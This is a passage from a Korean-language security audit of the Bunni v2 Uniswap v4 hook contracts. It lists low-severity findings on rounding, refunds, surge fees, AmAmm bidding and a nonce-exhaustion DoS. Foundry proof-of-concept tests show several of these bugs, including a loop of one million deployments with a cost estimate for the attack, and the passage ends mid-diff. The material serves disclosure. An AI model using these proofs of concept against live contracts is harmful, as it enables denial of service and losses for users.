229:             // below is an illustration of 4 rounded ticks, the input amount, and the resulting roundedTick (rick)
230:             // notice that the inverse tick is between two rounded ticks, and we round up to the rounded tick to the right
(...)
242:             (success, roundedTick) = inverseCumulativeAmount0(
243:                 inverseCumulativeAmountInput, totalLiquidity, tickSpacing, tickLower, tickUpper
244:             );
```

그러나 `LibUniformDistribution.sol` 및 `LibGeometricDistribution.sol` 라이브러리에 대한 이러한 함수의 구현을 살펴보면 `inverseCumulativeAmountInput`이 반올림된 틱에 매우 가까운 가격을 제공할 때 올림되지 않음을 알 수 있습니다.

```solidity
File: LibUniformDistribution.sol

138:             if (
139:                 sqrtPrice - sqrtPriceAtTick > 1
140:  @>                 && (sqrtPrice - sqrtPriceAtTick).mulDiv(SQRT_PRICE_MAX_REL_ERROR, sqrtPrice) > 1
141:             ) {
142:                 // getTickAtSqrtPrice erroneously rounded down to the rounded tick boundary
143:                 // need to round up to the next rounded tick
144:                 tick += tickSpacing;
```

```solidity
File: LibGeometricDistribution.sol

344:         // round xWad to reduce error
345:         // limits tick precision to (ROUND_TICK_TOLERANCE / WAD) of a rounded tick
346:  @>     xWad = (xWad / ROUND_TICK_TOLERANCE) * ROUND_TICK_TOLERANCE; // clear small errors
(...)
413:         // round xWad to reduce error
414:         // limits tick precision to (ROUND_TICK_TOLERANCE / WAD) of a rounded tick
415:  @>     xWad = (xWad / ROUND_TICK_TOLERANCE) * ROUND_TICK_TOLERANCE; // clear small errors
```

결과적으로 함수는 반올림된 틱에 소량의 유동성이 있는 경우에도 `swapLiquidity` 값을 0으로 잘못 반환합니다. 이는 스왑의 input 및 output 금액 계산에 오류를 일으킬 것입니다.

나머지 LDF가 `UniformDistribution` 및 `GeometricDistribution` LDF 위에 구축된다는 점을 감안할 때 이는 모든 LDF에 영향을 미칩니다.

## 개념 증명 (Proof of Concept)

다음 코드를 `BunniHub.t.sol` 파일에 추가하고 `forge test --mt test_diffTokenInTokenOut -vv`를 실행하세요.

```solidity
function test_diffTokenInTokenOut() external {
    (, PoolKey memory key) = _deployPoolAndInitLiquidity(
        Currency.wrap(address(token0)),
        Currency.wrap(address(token1)),
        ERC4626(address(0)),
        ERC4626(address(0))
    );

    // Swap to move price to lower tick
    _mint(key.currency0, address(this), 10e18);
    IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
        zeroForOne: true,
        amountSpecified: int256(1e18),
        sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
    });
    swapper.swap(key, params, type(uint256).max, 0);

    // Quote swap with exact input
    params = IPoolManager.SwapParams({
        zeroForOne: false,
        amountSpecified: -int256(100),
        sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
    });
    (,,, uint256 inputAmount, uint256 outputAmount,,) = quoter.quoteSwap(address(this), key, params);
    console.log("\nQuote exact input");
    console.log("inputAmount (token1) ", inputAmount);
    console.log("outputAmount (token0)", outputAmount);

    // Quote swap with exact output
    params = IPoolManager.SwapParams({
        zeroForOne: false,
        amountSpecified: int256(99),
        sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
    });
    (,,,inputAmount,outputAmount,,) = quoter.quoteSwap(address(this), key, params);
    console.log("\nQuote exact output");
    console.log("inputAmount (token1) ", inputAmount);
    console.log("outputAmount (token0)", outputAmount);
}
```

콘솔 출력:

```js
Quote exact input
  inputAmount (token1)  100
  outputAmount (token0) 99

Quote exact output
  inputAmount (token1)  1515890190660923693
  outputAmount (token0) 99
```

100 token1을 넣고 스왑하면 99 token0이 나옵니다. 따라서 99 token0을 빼내기 위해 스왑하면 100 token1이 들어와야 합니다. 그러나 그보다 훨씬 더 많은 양(1515890190660923693 token1)이 필요합니다.

## 권장 사항

`sqrtPrice`가 `sqrtPriceAtTick`과 같을 때마다 다음 반올림된 틱으로 올림하는 것을 고려해 보세요.

# [L-01] `shares` 매개변수가 0인 경우 대기 중인 지분(queued shares)의 인출이 되돌려짐(revert)

`params.shares`가 0일 때 `BunniHubLogic.withdraw`가 되돌려집니다. 그러나 `params.useQueuedWithdrawal` 값이 true인 경우 대기 중인 인출 지분 토큰이 대신 사용되므로 이 값은 사용되지 않습니다.

이는 `useQueuedWithdrawal`이 true로 설정된 상태에서 `withdraw` 함수가 호출될 때 호출자가 `shares`를 0이 아니 임의의 값으로 설정해야 함을 의미합니다. 대기 중인 지분 값이 대신 사용되므로 `shares` 값 0이 유효하다고 가정하는 프로토콜 통합에서는 이 동작이 예상치 못한 것일 수 있습니다.

예상치 못한 결과를 방지하려면 `BunniHubLogic.withdraw` 함수에 다음 변경 사항을 적용하는 것이 좋습니다:

```diff
-   if (params.shares == 0) revert BunniHub__ZeroInput();
+   if (!params.useQueuedWithdrawal && params.shares == 0) revert BunniHub__ZeroInput();
```

# [L-02] 배포 nonce 제한이 너무 작을 수 있음

`BunniHub` 계약은 누구나 새로운 `BunniToken`을 배포할 수 있도록 허용하지만, 횟수에 제한이 있으며 최대 `1,000,000`회까지 가능합니다(`1,000,000`은 UniswapV4 수수료의 상한선입니다).

```solidity
    function deployBunniToken(HubStorage storage s, Env calldata env, IBunniHub.DeployBunniTokenParams calldata params)
        external
        returns (IBunniToken token, PoolKey memory key)
    {
--snip--
        bytes32 bunniSubspace =
            keccak256(abi.encode(params.currency0, params.currency1, params.tickSpacing, params.hooks));
        uint24 nonce_ = s.nonce[bunniSubspace];
>>      if (nonce_ > MAX_NONCE) revert BunniHub__MaxNonceReached();
--snip--
```

공격자는 `nonce_`가 상한선에 도달하도록 새로운 `BunniToken`을 지속적으로 생성하여 `BunniHub`를 DoS 공격할 수 있습니다. 그러나 이를 위해서는 많은 가스 비용이 필요하므로 공격 비용과 영향의 관점에서 이 문제의 유해성을 판단해야 합니다.

다음은 가스 요금이 `30 GWei`이고 Matic 가격이 `0.5` USD인 Polygon 체인을 위해 제가 만든 테스트 데이터입니다. 1,000,000개의 BunniToken을 생성하는 데 `4990931099993` 가스가 소모되며, 총 `4990931099993 * 0.00000003 = 149727.93299979` MATIC으로 가치는 `149727.93299979 * 0.5 = 74863.966499895` USD입니다.

즉, 공격자는 Polygon 체인에서 75,000 USD를 소비하여 거래 쌍에 대한 `BunniToken` 배포를 DoS 공격할 수 있습니다. 향후 가스 요금이 인하되면 비용이 더 적게 들 수 있습니다.

이것은 관리자가 쓸모없는 `BunniToken` 계약을 삭제할 수 있도록 하는 간단한 계획입니다.

**부록: PoC**

이 테스트 함수를 `BunniHubTest` 계약에 삽입하세요.

```solidity
contract EmptyLiquidityDensityFunction {
    function isValidParams(PoolKey calldata key, uint24 twapSecondsAgo, bytes32 ldfParams) external view returns (bool) {
        return true;
    }
}

contract EmptyHooks {
    function isValidParams(bytes calldata hookParams) external view returns (bool) {
        return true;
    }

    function beforeInitialize(address, PoolKey calldata, uint160, bytes calldata) external pure returns (bytes4) {
        return IHooks.beforeInitialize.selector;
    }

    function afterInitialize(address, PoolKey calldata, uint160, int24, bytes calldata) external pure returns (bytes4) {
        return IHooks.afterInitialize.selector;
    }
}
```

그리고

```solidity
    function testYttriumzzPoC0002() external {
        Currency currency0 = Currency.wrap(address(token0));
        Currency currency1 = Currency.wrap(address(token1));
        ILiquidityDensityFunction emptyLiquidityDensityFunction = ILiquidityDensityFunction(address(new EmptyLiquidityDensityFunction()));
        BunniHook emptyHooks = BunniHook(payable(address(new EmptyHooks())));
        uint160 sqrtPriceX96 = TickMath.getSqrtPriceAtTick(4);
        address testOwner = makeAddr("testOwner");

        uint256 gasTotal;
        for (uint256 i = 0; i < 1000002; i++) {
            if (i == 1000001) {
                vm.expectRevert(BunniHub__MaxNonceReached.selector);
            }

            uint256 gasBefore = gasleft();
            (, PoolKey memory key) = hub.deployBunniToken(
                IBunniHub.DeployBunniTokenParams({
                    currency0: currency0,
                    currency1: currency1,
                    tickSpacing: TICK_SPACING,
                    twapSecondsAgo: TWAP_SECONDS_AGO,
                    liquidityDensityFunction: emptyLiquidityDensityFunction,
                    hooklet: IHooklet(address(0)),
                    statefulLdf: true,
                    ldfParams: bytes32(0),
                    hooks: emptyHooks,
                    hookParams: "",
                    vault0: ERC4626(address(0)),
                    vault1: ERC4626(address(0)),
                    minRawTokenRatio0: 0.08e6,
                    targetRawTokenRatio0: 0.1e6,
                    maxRawTokenRatio0: 0.12e6,
                    minRawTokenRatio1: 0.08e6,
                    targetRawTokenRatio1: 0.1e6,
                    maxRawTokenRatio1: 0.12e6,
                    sqrtPriceX96: sqrtPriceX96,
                    name: "",
                    symbol: "",
                    owner: testOwner,
                    metadataURI: "",
                    salt: bytes32(i)
                })
            );
            uint256 gasAfter = gasleft();
            uint256 gasUsed = gasBefore - gasAfter;
            gasTotal += gasUsed;
            console.log("nonce: %s, gasUsed: %s, gasTotal: %s", key.fee, gasUsed, gasTotal);
        }
    }
```

# [L-03] 외부 입금으로 인한 풀 잔액의 불일치

BunniV2에서 **풀 잔액**은 두 가지 주요 구성 요소를 사용하여 프로토콜 내에서 추적됩니다.

1. **Raw Balances**: 풀이 직접 보유한 토큰의 실제 양을 나타냅니다.
2. **Vault Balances**: 수익을 얻거나(yield earning) 다른 전략에 사용될 가능성이 있는 볼트에 보관된 토큰을 나타냅니다.

이들의 잔액은 사용자가 `BunniHub::deposit` 및 `BunniHub::withdraw`와 상호 작용할 때마다 업데이트되며, 이는 풀의 유동성 밀도 함수(LDF)에 따라 유동성이 올바르게 분배되도록 하기 위해 **리밸런싱 기능**에 사용됩니다.

```solidity
File: BunniHookLogic.sol
130:     function beforeSwap(
131:         HookStorage storage s,
132:         Env calldata env,
133:         address sender,
134:         PoolKey calldata key,
135:         IPoolManager.SwapParams calldata params
136:     )
137:         external
138:         returns (
139:             bool useAmAmmFee,
140:             address amAmmManager,
141:             Currency amAmmFeeCurrency,
142:             uint256 amAmmFeeAmount,
143:             BeforeSwapDelta beforeSwapDelta
144:         )
145:     {
...
...
435:
436:         // we should rebalance if:
437:         // - rebalanceThreshold != 0, i.e. rebalancing is enabled
438:         // - shouldSurge == true, since tokens can only go out of balance due to shifting or vault returns
439:         // - the deadline of the last rebalance order has passed
440:         if (hookParams.rebalanceThreshold != 0 && shouldSurge && block.timestamp > s.rebalanceOrderDeadline[id]) {
441:             _rebalance(
442:                 s,
443:                 env,
444:                 RebalanceInput({
445:                     id: id,
446:                     key: key,
447:                     updatedTick: updatedTick,
448:                     updatedSqrtPriceX96: updatedSqrtPriceX96,
449:                     arithmeticMeanTick: arithmeticMeanTick,
450:                     newLdfState: newLdfState,
451:                     hookParams: hookParams,
452:                     updatedIntermediate: updatedIntermediate,
453:                     updatedIndex: updatedIndex,
454:                     updatedCardinality: updatedCardinality
455:                 })
456:             );
457:         }
...
...
475:     }
```

그러나 `poolManager::modifyPosition`([Uniswap 계약](https://docs.uniswap.org/contracts/v4/concepts/managing-positions)의 일부)과 같은 외부 함수를 사용하면 사용자가 Bunni 예금 함수와 상호 작용하지 않고도 기본 Uniswap 풀에서 유동성 포지션을 직접 수정할 수 있습니다. 이러한 외부 상호 작용은 Bunni 프로토콜이 즉시 인식하지 못하는 상태에서 풀의 토큰 잔액을 변경하여 프로토콜의 내부 회계에 잠재적인 불일치를 초래할 수 있습니다.

`poolManager::modifyPosition`을 사용하여 토큰을 풀에 직접 예치하는 경우:

- **잔액 불일치**: Uniswap 풀의 토큰 원시 잔액(raw balance)은 Bunni 프로토콜의 내부 회계(원시 및 볼트 잔액)에 해당 업데이트 없이 변경될 수 있습니다. 이로 인해 실제 풀 상태와 프로토콜이 인식하는 상태 간에 불일치가 발생합니다.
- **잘못된 리밸런싱 계산**: 리밸런싱 기능은 풀의 현재 상태에 대한 정확한 데이터에 의존합니다. 실제 토큰 잔액이 프로토콜이 예상하는 것과 다른 경우 리밸런싱이 잘못 수행되어 잠재적으로 차선의 유동성 분배 또는 손실로 이어질 수 있습니다.

**Uniswap 훅 `beforeModifyPosition`**은 실제로 이 문제를 완화할 수 있습니다. 훅은 불균형을 야기하거나 프로토콜의 내부 회계에 영향을 미치는 예금 모든 예금을 되돌릴 수 있습니다.

# [L-04] `BunniHubLogic`에서 볼트 수수료 제외로 인한 잘못된 환불 계산

`BunniHubLogic` 계약에는 사용되지 않은 `msg.value`에 대한 환불 메커니즘이 있습니다. 환불 로직은 현재 `raw` 및 `reserve` 금액의 합계인 `amount0` 및 `amount1`만 고려합니다. 그러나 입금이 이루어지고 볼트 수수료가 적용될 때 볼트 수수료 금액은 환불 과잉 계산에 포함되지 않습니다. 결과적으로 볼트 수수료가 환불될 총 이더에서 공제되지 않아 잘못된 환불 금액이 발생합니다.

예를 들어, 사용자가 입금 함수에 `msg.value`로 `20 ether`를 보내고 `vaultFee`가 `1 ether`인 상태에서 `amount0Desired`를 `10 ether`로 지정하는 경우, 사용된 총 이더는 `11 ether`입니다(amount0으로 10 ether(raw 및 reserve 포함) 및 볼트 수수료로 1 ether). 현재 환불 로직은 볼트 수수료를 고려하지 않으므로 올바른 9 ether 대신 10 ether를 잘못 환불합니다.

```solidity
File: BunniHubLogic.sol
073:     function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
074:         external
075:         returns (uint256 shares, uint256 amount0, uint256 amount1)
076:     {
...
...
171:         // refund excess ETH
172:         if (params.poolKey.currency0.isNative()) {
173:             if (address(this).balance != 0) {
174:                 params.refundRecipient.safeTransferETH(
175:                     FixedPointMathLib.min(address(this).balance, msg.value - amount0)
176:                 );
177:             }
178:         } else if (params.poolKey.currency1.isNative()) {
179:             if (address(this).balance != 0) {
180:                 params.refundRecipient.safeTransferETH(
181:                     FixedPointMathLib.min(address(this).balance, msg.value - amount1)
182:                 );
183:             }
184:         }
...
...
196:     }
```

볼트 수수료를 고려하도록 환불 계산을 업데이트하여 사용된 총 이더가 `msg.value`에서 정확하게 공제되도록 하세요.

# [L-05] ERC4626 볼트의 `previewRedeem` 함수가 되돌려질(revert) 수 있음

볼트의 `previewRedeem` 함수는 풀이 소유한 자산의 총 가치를 얻기 위해 프로토콜 전체에서 호출됩니다.

[EIP-4626 사양](https://eips.ethereum.org/EIPS/eip-4626)에 따르면 `previewRedeem` 함수는 "볼트별 사용자/글로벌 제한으로 인해 되돌려져서는 안 되지만(MUST NOT)", **"교환(redeem)이 되돌려질 수 있는 다른 조건으로 인해 되돌려질 수 있습니다(MAY)"**. 이는 볼트가 일시 중지되는 것과 같이 특정 조건하에서 사양의 일부 유효한 구현이 되돌려질 수 있음을 의미하며, 이는 Bunni 프로토콜의 대부분의 기능을 되돌릴 수 있습니다.

프로토콜은 "재담보를 위해 평판이 좋고 감사를 받은 프로토콜을 선택하는 것이 중요하다"는 점을 인정하지만, EIP-4626 사양을 올바르게 따르는 볼트에서 이 문제가 발생할 수 있다는 점을 감안할 때 `previewRedeem`에서 되돌려지는 볼트를 재담보에 사용해서는 안 된다는 점을 문서화하는 것이 좋습니다.

# [L-06] `lastSurgeTimestamp` 오버플로우 시 서지 수수료의 잘못된 계산

`BunniHookLogic.beforeSwap` 및 `BunniQuoter.quoteSwap` 함수에서 `lastSurgeTimestamp` 계산은 다음과 같습니다:

```solidity
File: BunniHookLogic.sol

    // use unchecked so that if uint32 overflows we wrap around
    // overflows are ok since we only look at differences
    unchecked {
        uint32 timeSinceLastSwap = uint32(block.timestamp) - slot0.lastSwapTimestamp;
        // if more than `surgeFeeAutostartThreshold` seconds has passed since the last swap,
        // we pretend that the surge started at `slot0.lastSwapTimestamp + surgeFeeAutostartThreshold`
        // so that the pool never gets stuck with a high fee
        lastSurgeTimestamp = timeSinceLastSwap >= hookParams.surgeFeeAutostartThreshold
            ? slot0.lastSwapTimestamp + hookParams.surgeFeeAutostartThreshold
            : uint32(block.timestamp);
    }
```

주석은 타임스탬프 값이 오버플로우될 수 있으며 타임스탬프 간의 차이만 중요하기 때문에 문제가 되지 않는다고 인정합니다. 그러나 `lastSurgeTimestamp` 값은 `FeeMath.computeSurgeFee` 함수에서 서지 수수료를 계산하는 데 사용되며, 여기서 `timeSinceLastSurge`는 `block.timestamp` 값(uint256)과 `lastSurgeTimestamp`(uint32) 간의 차이로 계산됩니다.

```solidity
File: FeeMath.sol

function computeSurgeFee(uint32 lastSurgeTimestamp, uint24 surgeFee, uint16 surgeFeeHalfLife)
    view
    returns (uint24 fee)
{
    // compute surge fee
    // surge fee gets applied after the LDF shifts (if it's dynamic)
    unchecked {
@>      uint256 timeSinceLastSurge = block.timestamp - lastSurgeTimestamp;
        fee = uint24(
            uint256(surgeFee).mulWadUp(
                uint256((-int256(timeSinceLastSurge.mulDiv(LN2_WAD, surgeFeeHalfLife))).expWad())
            )
        );
    }
}
```

`lastSurgeTimestamp` 계산이 오버플로우되는 경우 그 값은 매우 낮을 것이고 `block.timestamp`는 매우 높을 것입니다. 이로 인해 `timeSinceLastSurge` 값이 매우 커져 서지 수수료가 0으로 계산됩니다.

```diff
    unchecked {
-       uint256 timeSinceLastSurge = block.timestamp - lastSurgeTimestamp;
+       uint256 timeSinceLastSurge = uint32(block.timestamp) - lastSurgeTimestamp;
        fee = uint24(
            uint256(surgeFee).mulWadUp(
                uint256((-int256(timeSinceLastSurge.mulDiv(LN2_WAD, surgeFeeHalfLife))).expWad())
            )
        );
    }
```

# [L-07] `setReferrerAddress`가 보상을 정산(settle)하지 않아 추천인 보상이 손실될 수 있음

`BunniHub.setReferrerAddress` 함수를 사용하면 관리자 또는 추천인이 새로운 `referrerAddress`를 설정할 수 있습니다. 코드는 다음과 같습니다.

```solidity
    function setReferrerAddress(uint24 referrer, address referrerAddress) external {
        if (msg.sender != owner() && msg.sender != s.referrerAddress[referrer]) revert BunniHub__Unauthorized();
        if (referrer > MAX_REFERRER) revert BunniHub__InvalidReferrer();
        s.referrerAddress[referrer] = referrerAddress;
        emit SetReferrerAddress(referrer, referrerAddress);
    }
```

하지만 추천인 보상은 사용자가 수동으로 정산해야 하므로 `referrerAddress`를 업데이트하면 원래 보상이 새 `referrerAddress`에 게시될 수 있습니다. 특히 관리자가 `setReferrerAddress`를 호출할 때 추천인의 보상이 예상치 못하게 손실될 수 있습니다.

새 `referrerAddress`를 설정하기 전에 현재 보상을 정산하는 것이 좋습니다.

# [L-08] 정확한 출력(exact output) 스왑이 예상보다 적은 출력을 초래할 수 있음

정확한 출력 스왑이 요청된 경우 `amountSpecified`와 `outputAmount` 중 최소값이 실제 출력 금액으로 사용되므로 정확한 출력 금액이 사용자가 지정한 금액보다 적을 수 있습니다.

```solidity
File: BunniHookLogic.sol

385         // give out min(amountSpecified, outputAmount) such that if amountSpecified is greater we only give outputAmount and let the tx revert
386  @>     int256 actualOutputAmount = FixedPointMathLib.min(params.amountSpecified, outputAmount.toInt256());
387         outputAmount = uint256(actualOutputAmount);
388         beforeSwapDelta = toBeforeSwapDelta({
389             deltaSpecified: -actualOutputAmount.toInt128(),
390             deltaUnspecified: inputAmount.toInt256().toInt128()
391         });
```

`outputAmount` 값은 `BunniSwapMath` 라이브러리의 `computeSwap` 함수에서 계산됩니다. 코드에는 이 값이 사용자가 지정한 금액보다 낮아질 수 있는 부분이 있습니다. 첫 번째는 `amountSpecified`가 풀의 출력 토큰 총 잔액보다 높은 경우이고, 두 번째는 `computeSwap` 함수에서 수행된 스왑 계산이 예상보다 낮은 출력 금액을 초래하는 경우입니다.

```solidity
File: BunniSwapMath.sol

56      if (amountSpecified > 0 && uint256(amountSpecified) > outputTokenBalance) {
57          // exact output swap where the requested output amount exceeds the output token balance
58          // change swap to an exact output swap where the output amount is the output token balance
59  @>      amountSpecified = outputTokenBalance.toInt256();
60      }
61
62      // compute first pass result
63  @>  (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount) = _computeSwap(input, amountSpecified);
```

사용자는 토큰을 스왑하기 위해 Uniswap의 v4 라우터를 사용할 것으로 예상되며, 정확한 출력 스왑의 경우 다음 매개변수가 전달될 것으로 예상됩니다:

```solidity
struct ExactOutputSingleParams {
    PoolKey poolKey;
    bool zeroForOne;
    uint128 amountOut;
    uint128 amountInMaximum;
    uint160 sqrtPriceLimitX96;
    bytes hookData;
}
```

`sqrtPriceLimitX96`은 슬리피지 보호에 사용될 수 있지만 부분 체결(partial fills)을 방지하기 위해 `0`을 값으로 전달하는 것이 일반적입니다. 결과적으로 사용자는 예상보다 적은 토큰을 받을 수 있으며, `amountInMaximum`이 초과되지 않는 한 트랜잭션은 되돌려지지 않습니다.

다음 예를 들어보겠습니다:

- Alice는 정확한 출력 100 XYZ에 대해 최대 1,000 USDC를 지불할 의향이 있습니다.
- 풀에 XYZ가 50개만 있으므로 출력 금액은 예상되는 100 XYZ 대신 50 XYZ입니다.
- Alice는 1,000 USDC를 청구받습니다.
- Alice는 XYZ당 20 USDC를 지불했으며, 이는 예상 한도인 XYZ당 10 USDC보다 큽니다.

**개념 증명 (Proof of concept):**

**설정 (Setup)**

- Uniswap v4 periphery 계약을 프로젝트에 추가합니다.

```shell
forge install Uniswap/v4-periphery@f2f68ecf37b6b881adc74aec11bde24f22b82afb --no-commit
```

- `foundry.toml`에 새 재매핑(remapping)을 생성합니다.

```json
    "@uniswap/v4-periphery/=lib/v4-periphery/",
```

**테스트 (Test)**

다음 코드를 `BunniHub.t.sol` 파일에 추가하고 `forge test --mt test_exactOutputNotFilled`를 실행하세요.

```solidity
import {IV4Router} from "@uniswap/v4-periphery/src/interfaces/IV4Router.sol";
import {Actions} from "@uniswap/v4-periphery/src/libraries/Actions.sol";
import {MockV4Router} from "@uniswap/v4-periphery/test/mocks/MockV4Router.sol";
import {Plan, Planner} from "@uniswap/v4-periphery/test/shared/Planner.sol";

(...)

    using Planner for Plan;

    function test_exactOutputNotFilled() external {
        MockV4Router v4Router = new MockV4Router(poolManager);

        (, PoolKey memory key) = _deployPoolAndInitLiquidity(
            Currency.wrap(address(token0)),
            Currency.wrap(address(token1)),
            ERC4626(address(0)),
            ERC4626(address(0))
        );

        // User is willing to pay up to 1.2 token0 for 2 token1
        uint256 amountOut = 2e18;
        uint256 amountInMaximum = 1.2e18;
        _mint(key.currency0, address(this), amountInMaximum);
        token0.approve(address(v4Router), amountInMaximum);

        uint256 initialBalance0 = IERC20(address(token0)).balanceOf(address(this));
        uint256 initialBalance1 = IERC20(address(token1)).balanceOf(address(this));

        IV4Router.ExactOutputSingleParams memory params = IV4Router.ExactOutputSingleParams(
            key,
            true, // zeroForOne
            uint128(amountOut),
            uint128(amountInMaximum),
            0, // sqrtPriceLimitX96
            bytes("") // hookData
        );

        Plan memory plan = Planner.init();
        plan = plan.add(Actions.SWAP_EXACT_OUT_SINGLE, abi.encode(params));
        bytes memory data = plan.finalizeSwap(
            Currency.wrap(address(token0)),
            Currency.wrap(address(token1)),
            address(this)
        );
        v4Router.executeActions(data);

        uint256 token0Spent = initialBalance0 - IERC20(address(token0)).balanceOf(address(this));
        uint256 token1Received = IERC20(address(token1)).balanceOf(address(this)) - initialBalance1;

        // User spent more than 1.1e18 token0, which is below the maximum amountIn,
        // but in exchange for much less than the expected amount of token1
        assert(token0Spent > 1.1e18);
        assert(token1Received < 1e18);
    }
```

출력 금액이 사용자가 지정한 금액보다 적으면 트랜잭션을 되돌리는 것이 좋습니다.

# [L-09] 입금 시 낮은 인출 수수료 값을 제공하면 불균형이 발생할 수 있음

재담보에 사용되는 볼트는 인출 시 수수료를 부과할 수 있습니다. 이러한 볼트를 사용하는 풀에 입금하는 경우 사용자가 인출 수수료 값을 제공할 것으로 예상됩니다. 사용자가 수수료 값을 0으로 제공하지만 실제 수수료가 0이 아닌 경우, 발행되는 지분의 양이 적어지므로 실제 수수료보다 낮은 수수료를 제공할 유인이 없어 허용됩니다.

```solidity
File: BunniHubLogic.sol
645:         // use the pre-fee amount to ensure `amount` is the amount of tokens
646:         // that we'll be able to withdraw from the vault
647:         // it's safe to rely on the user provided fee value here
648:         // since if user provides fee=0 when it's actually not the amount of bunni shares minted goes down
649:         // and if user provide fee!=0 when the fee is some other value (0 or non-zero) the validation will revert
650:         uint256 postFeeAmount = amount; // cache amount to use for validation later
651:         amount = amount.divWadUp(WAD - vaultFee);
```

그러나 두 토큰의 볼트가 인출 시 동일한 수수료를 청구하는 경우, 예금자가 두 토큰 모두에 대해 수수료 값을 0으로 제공하면 예금된 금액에 비례하여 지분을 받게 되므로 그에게는 아무런 손해가 발생하지 않습니다. 그러나 프로토콜의 결과는 예상보다 적은 토큰이 볼트에 예금되어 `raw balance/total balance` 비율이 높아지는 것입니다. 이 비율 불균형의 영향은 수수료 값을 0으로 제공하는 각 입금마다 증가하여 볼트의 리밸런싱을 더 자주 요구하게 됩니다.

사용자가 제공한 수수료 값이 항상 볼트에서 청구하는 실제 수수료인지 확인하십시오.

# [L-10] `AmAmm` 일시 중지로 인해 최고가 아닌 입찰이 인수(take over)할 수 있음

`AmAmm` 계약은 관리자가 `BunniHook.setAmAmmEnabledOverride`를 호출하여 계약을 일시 중지/일시 중지 해제할 수 있도록 허용합니다. 계약이 일시 중지되면 사용자는 더 이상 입찰을 제출할 수 없습니다. 그리고 계약이 일시 중지 해제되면 마지막 NextBid가 즉시 TopBid가 될 수 있습니다. 이로 인해 최고가 아닌 입찰이 TopBid가 됩니다.

일시 중지 해제 후 `AmAmm`은 NextBid를 지워야 합니다.

# [L-11] `AmAmm.sol`의 환불 불일치

`AmAmm.sol`에서 사용자가 입찰할 때 `msgSender`(자산의 실제 예금자, 코드 라인 `AmAmm#L100`)와 다를 수 있는 `manager`를 지정합니다. 더 나은 입찰이 있어 입찰이 실패하면 자산은 `msgSender` 대신 `manager`에게 환불됩니다(코드 라인 `AmAmm#L089`). 이러한 잘못된 할당은 `manager`가 아닌 예금자에게 자금 손실을 초래할 수 있습니다.

```solidity
File: AmAmm.sol
056:     /// @inheritdoc IAmAmm
057:>>>  function bid(PoolId id, address manager, bytes7 payload, uint128 rent, uint128 deposit) external virtual override {
058:         /// -----------------------------------------------------------------------
059:         /// Validation
060:         /// -----------------------------------------------------------------------
061:
062:>>>      address msgSender = LibMulticaller.senderOrSigner();
063:
064:         if (!_amAmmEnabled(id)) {
065:             revert AmAmm__NotEnabled();
066:         }
067:
068:         /// -----------------------------------------------------------------------
069:         /// State updates
070:         /// -----------------------------------------------------------------------
071:
072:         // update state machine
073:         _updateAmAmmWrite(id);
074:
075:         // ensure bid is valid
076:         // - manager can't be zero address
077:         // - bid needs to be greater than the next bid by >10%
078:         // - deposit needs to cover the rent for K hours
079:         // - deposit needs to be a multiple of rent
080:         // - payload needs to be valid
081:         if (
082:             manager == address(0) || rent <= _nextBids[id].rent.mulWad(MIN_BID_MULTIPLIER(id)) || deposit < rent * K(id)
083:                 || deposit % rent != 0 || !_payloadIsValid(id, payload)
084:         ) {
085:             revert AmAmm__InvalidBid();
086:         }
087:
088:>>>      // refund deposit of the previous next bid
089:>>>      _refunds[_nextBids[id].manager][id] += _nextBids[id].deposit;
090:
091:         // update next bid
092:         uint40 epoch = _getEpoch(id, block.timestamp);
093:>>>      _nextBids[id] = Bid(manager, epoch, payload, rent, deposit);
094:
095:         /// -----------------------------------------------------------------------
096:         /// External calls
097:         /// -----------------------------------------------------------------------
098:
099:         // transfer deposit from msg.sender to this contract
100:>>>      _pullBidToken(id, msgSender, deposit);
101:
102:         emit SubmitBid(id, manager, epoch, payload, rent, deposit);
103:     }
```

다음 시나리오를 고려해 보세요:

1. `msgSenderA`가 `bid` 함수를 호출하고 계약 `0x1234`를 관리자로 지정하여 `nextBid`에 저장됩니다.
2. `msgSenderB`가 더 높은 입찰을 하여 1단계의 자금이 `msgSenderA`가 아닌 관리자 `0x1234`에게 환불됩니다.
3. `msgSenderA`는 다른 입찰을 하기를 원하지만, 이제 2단계의 금액을 초과하는 새 입찰을 하려면 관리자로부터 자금을 회수하거나 추가 자산을 제공해야 합니다.

반면, `AmAmm::depositIntoNextBid` 함수는 `msgSender`가 `manager`와 같은지 확인하므로 잠재적인 환불은 동일한 주체인 예금자나 관리자에게 가야 한다고 말할 수 있습니다.

```solidity
File: AmAmm.sol
199:     function depositIntoNextBid(PoolId id, uint128 amount) external virtual override {
...
...
219:         // only the next bid manager can deposit into the next bid
220:>>>      if (msgSender != nextBid.manager) {
221:             revert AmAmm__Unauthorized();
222:         }
...
...
240:     }
```

환불의 불일치를 방지하기 위해 `bid` 함수가 관리자와 예금자를 통일하는 것이 좋습니다.

```diff
-  function bid(PoolId id, address manager, bytes7 payload, uint128 rent, uint128 deposit) external virtual override {
+  function bid(PoolId id, bytes7 payload, uint128 rent, uint128 deposit) external virtual override {
        /// -----------------------------------------------------------------------
        /// Validation
        /// -----------------------------------------------------------------------

        address msgSender = LibMulticaller.senderOrSigner();

        if (!_amAmmEnabled(id)) {
            revert AmAmm__NotEnabled();
        }

        /// -----------------------------------------------------------------------
        /// State updates
        /// -----------------------------------------------------------------------

        // update state machine
        _updateAmAmmWrite(id);

        // ensure bid is valid
        // - manager can't be zero address
        // - bid needs to be greater than the next bid by >10%
        // - deposit needs to cover the rent for K hours
        // - deposit needs to be a multiple of rent
        // - payload needs to be valid
        if (
            manager == address(0) || rent <= _nextBids[id].rent.mulWad(MIN_BID_MULTIPLIER(id)) || deposit < rent * K(id)
                || deposit % rent != 0 || !_payloadIsValid(id, payload)
        ) {
            revert AmAmm__InvalidBid();
        }

        // refund deposit of the previous next bid
        _refunds[_nextBids[id].manager][id] += _nextBids[id].deposit;

        // update next bid
        uint40 epoch = _getEpoch(id, block.timestamp);
-       _nextBids[id] = Bid(manager, epoch, payload, rent, deposit);
+       _nextBids[id] = Bid(msgSender, epoch, payload, rent, deposit);  // msgSender is the manager too

        /// -----------------------------------------------------------------------
        /// External calls
        /// -----------------------------------------------------------------------

        // transfer deposit from msg.sender to this contract
        _pullBidToken(id, msgSender, deposit);

        emit SubmitBid(id, manager, epoch, payload, rent, deposit);
